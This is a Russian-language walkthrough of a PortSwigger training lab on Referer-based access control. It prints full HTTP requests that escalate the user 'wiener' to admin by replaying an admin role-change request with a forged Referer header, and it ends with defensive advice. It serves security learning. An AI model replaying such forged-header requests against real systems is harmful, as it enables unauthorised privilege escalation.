лаба https://portswigger.net/web-security/access-control/lab-referer-based-access-control
#### Контроль доступа на основе референта

тупая защита, которую валит любой школьник с burp

ПРИМЕР

админка висит на `/admin` — туда просто так не зайти

функцию удаления юзера `/admin/deleteUser` разработчик не защитил (положил на это дело гаек и болтов) и если в заголовке Referer написано `/admin`, значит, запрос пришёл от админа, пропускаем"...

то есть добавил` Referer: https://example.com/admin ` и сервак подумал - что раз рефер верный - то можно верить!


---


решение лабы: 
задание: зайти в админку administrator  :  admin
посмотреть методы

зайти на свой акк wiener : peter
использовать теже методы чтобы сделать себя админом

-----

зашел на ак админа - есть метод меняющий роли юзерам

```http
GET /admin-roles?username=carlos&action=downgrade HTTP/2
Host: 0aeb00ab03d883a480c735df004300eb.web-security-academy.net
Cookie: session=dl2brLhkiA80NlImHqo1vfLTuBKfQMEn
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00ab03d883a480c735df004300eb.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

запомнил этот запрос

-----

зашел на собственный ак wiener

вот моя стр 
```http
GET /my-account?id=wiener HTTP/2
Host: 0aeb00ab03d883a480c735df004300eb.web-security-academy.net
Cookie: session=wUVJHMZWFzBZvuNmfCthu85GjaVYqVGM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00ab03d883a480c735df004300eb.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

меняю на админский запрос

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0aeb00ab03d883a480c735df004300eb.web-security-academy.net
Cookie: session=wUVJHMZWFzBZvuNmfCthu85GjaVYqVGM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00ab03d883a480c735df004300eb.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

ответ 404 "Unauthorized"

------

пробую менять Referer

Referer: /admin

меняю 
`Referer: https://0aeb00ab03d883a480c735df004300eb.web-security-academy.net/login`

на 

``Referer: https://0aeb00ab03d883a480c735df004300eb.web-security-academy.net/admin``

ответ:
```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

### wiener стал админом! лаба решена!

----

## вывод:

лаба показала  пример контроля доступа по рефереру

админский функционал (`/admin-roles`) проверял не права пользователя, а всего лишь заголовок `Referer`

если он содержал админский URL (`/admin`), сервер доверял и выполнял действие

я просто скопировал запрос от админа, подставил свою сессию `wiener` и добавил правильный `Referer`. Вуаля — стал админом Никакой проверки кук или прав на бэкенде

## защита от такого:

никогда не использовать `Referer` как единственный или основной фактор авторизации

контроль доступа должен выполняться на основе серверных данных (роли пользователя в БД, права доступа), а не на основе HTTP-заголовков, которые подделываются в два счета

если нужно проверить происхождение запроса, используй CSRF-токены, а не реферер


--------





